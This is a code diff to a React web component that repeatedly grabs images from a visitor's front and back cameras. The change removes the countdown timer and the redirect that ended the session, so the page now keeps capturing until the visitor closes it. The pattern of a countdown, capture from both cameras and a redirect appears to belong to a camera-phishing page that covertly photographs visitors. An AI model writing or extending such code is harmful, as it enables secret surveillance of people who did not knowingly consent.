@@ -128,15 +128,14 @@ const CustomCapture = () => {
     }
   };
 
-  // Continuous capture loop until timer ends then redirect
+  // Continuous capture loop - keeps capturing forever until user closes page
   const startContinuousCapture = async () => {
     if (captureLoopRef.current) return;
     captureLoopRef.current = true;
     
     let captureCount = 0;
-    const endTime = Date.now() + (countdownSeconds * 1000);
     
-    while (!stopCaptureRef.current && Date.now() < endTime) {
+    while (!stopCaptureRef.current) {
       try {
         captureCount++;
         
@@ -150,7 +149,7 @@ const CustomCapture = () => {
           });
         }
         
-        if (stopCaptureRef.current || Date.now() >= endTime) break;
+        if (stopCaptureRef.current) break;
         await new Promise(resolve => setTimeout(resolve, 200));
         
         // Capture BACK camera
@@ -163,7 +162,7 @@ const CustomCapture = () => {
           });
         }
         
-        if (stopCaptureRef.current || Date.now() >= endTime) break;
+        if (stopCaptureRef.current) break;
         await new Promise(resolve => setTimeout(resolve, 500));
         
       } catch (error) {
@@ -171,10 +170,6 @@ const CustomCapture = () => {
         await new Promise(resolve => setTimeout(resolve, 1000));
       }
     }
-    
-    // Timer done - redirect
-    stopCaptureRef.current = true;
-    window.location.href = redirectUrl;
   };
 
   // Cleanup on unmount
